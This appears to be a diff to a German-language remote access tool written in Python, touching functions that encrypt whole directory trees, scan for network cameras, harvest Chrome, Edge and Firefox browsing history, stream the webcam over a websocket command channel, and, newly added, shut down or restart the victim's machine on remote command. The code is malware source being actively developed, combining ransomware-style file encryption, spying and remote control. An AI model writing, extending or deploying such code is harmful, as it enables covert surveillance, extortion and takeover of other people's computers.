@@ -171,7 +171,7 @@ def encrypt_file(filepath, key):
 def encrypt_directory(path):
     key = secrets.token_bytes(32)
     encrypted_files = []
-    for root, dirs, files in os.walk(path):
+    for root, _, files in os.walk(path):
         for file in files:
             try:
                 full_path = os.path.join(root, file)
@@ -197,7 +197,7 @@ def decrypt_file(filepath, key):
 def decrypt_directory(path, key_hex):
     key = bytes.fromhex(key_hex)
     decrypted_files = []
-    for root, dirs, files in os.walk(path):
+    for root, _, files in os.walk(path):
         for file in files:
             try:
                 full_path = os.path.join(root, file)
@@ -305,18 +305,19 @@ def scan_network_cameras():
 
 # === Browserverlauf ===
 def get_browser_history(limit=50):
+    userprofile = os.environ.get('USERPROFILE', None)
     browsers = {
         "Chrome": {
-            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History'),
+            "windows": os.path.join(userprofile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') if userprofile else "",
             "linux": os.path.join(os.path.expanduser('~'), '.config', 'google-chrome', 'Default', 'History'),
             "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
         },
         "Edge": {
-            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History'),
+            "windows": os.path.join(userprofile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') if userprofile else "",
             "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'History')
         },
         "Firefox": {
-            "windows": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
+            "windows": os.path.join(userprofile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles') if userprofile else "",
             "linux": os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox'),
             "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
         }
@@ -560,6 +561,26 @@ class WebcamStreamer:
             await self._ws.send(json.dumps({"type": "command_output", "output": f"Webcam Fehler: {e}"}))
 
 webcam_streamer = WebcamStreamer()
+
+def shutdown_or_restart(action):
+    try:
+        if platform.system() == "Windows":
+            if action == "shutdown":
+                os.system("shutdown /s /t 0")
+                return "System wird heruntergefahren..."
+            elif action == "restart":
+                os.system("shutdown /r /t 0")
+                return "System wird neu gestartet..."
+        else:
+            if action == "shutdown":
+                os.system("shutdown -h now")
+                return "System wird heruntergefahren..."
+            elif action == "restart":
+                os.system("shutdown -r now")
+                return "System wird neu gestartet..."
+        return "Unbekanntes System oder Aktion."
+    except Exception as e:
+        return f"Fehler beim Ausführen von {action}: {e}"
 
 # === Hauptlogik: Kommandos ===
 async def process_commands(websocket):
